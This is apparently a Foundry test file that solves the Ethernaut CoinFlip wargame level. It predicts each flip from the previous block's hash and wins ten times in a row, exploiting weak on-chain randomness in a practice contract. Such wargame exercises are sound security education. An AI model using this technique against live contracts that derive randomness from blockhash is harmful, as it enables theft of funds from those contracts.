// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {CoinFlip} from "../../src/03/CoinFlip.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {CoinFlipFactory} from "src/03/CoinFlipFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";
import {SafeMath} from "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipTest is Test, BaseTest {
    using SafeMath for uint256;

    CoinFlip public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new CoinFlipFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = CoinFlip(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint8 WINS_TO_COMPLETE_LEVEL = 10;
        uint256 blockValue;
        bool side;
        uint256 coinFlip;

        // uint256 i = 0;
        do {
            blockValue = uint256(blockhash(block.number.sub(1)));
            coinFlip = blockValue.div(FACTOR);
            side = coinFlip == 1 ? true : false;
            instanceContract.flip(side);

            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 1);

            // unchecked {
            //     ++i;
            // }
        } while (instanceContract.consecutiveWins() < WINS_TO_COMPLETE_LEVEL);

        vm.stopPrank();

        assert(instanceContract.consecutiveWins() == WINS_TO_COMPLETE_LEVEL);
    }
}
